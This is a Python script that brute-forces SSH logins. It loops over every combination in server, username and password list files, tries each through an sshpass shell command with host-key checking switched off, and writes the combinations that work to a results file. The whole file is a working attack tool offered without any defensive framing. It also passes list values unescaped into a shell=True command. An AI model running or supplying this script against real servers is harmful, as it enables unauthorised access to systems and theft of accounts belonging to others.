import subprocess                       # To process a shell command

### DEFINING FUNCTIONS ###

# Create a clean version of a file without newlines 
def proper_file(old_file, new_file):
    with open(old_file) as old_file:
        with open(new_file, 'w+') as new_file:
            for line in old_file:
                if (line != '\n'):
                    new_file.write(line)
            


### LET'S GO FAM ###

## Defining resource files ##
# Bank files #
server_bank = 'resources/bank_servers'
user_bank = 'resources/bank_users'
password_bank = 'resources/bank_passwords'

# Newly created files #
servers = 'resources/cleaned_servers'
users = 'resources/cleaned_users'
passwords = 'resources/cleaned_passwords'
successful_tuples = 'successful_tuples'



## Cleaning files ##
proper_file(server_bank, servers)
proper_file(user_bank, users)
proper_file(password_bank, passwords)



## Writing all successful SSH tuples to the "successful_tuples" file
with open(successful_tuples, "w+") as successful_tuples:
# Bringing every possible user/password/server tuples
    for server in open(servers):
        server = server[:-1]            # Removing the "\n" newline key
        for user in open(users):
            user = user[:-1]
            for password in open(passwords):
                password = password[:-1]

                # Creating the SSH command to be tested
                constructed_line = "sshpass -p '%s' ssh -o StrictHostKeyChecking=no '%s'@'%s' exit \n" %  (password, user, server)
                
                # Testing the newly constructed command
                result = subprocess.call(constructed_line, shell=True, stderr=subprocess.DEVNULL)
                if result == 0 :
                    print("server: %s | username: %s | password: %s \n" % (server, user, password), file=successful_tuples)

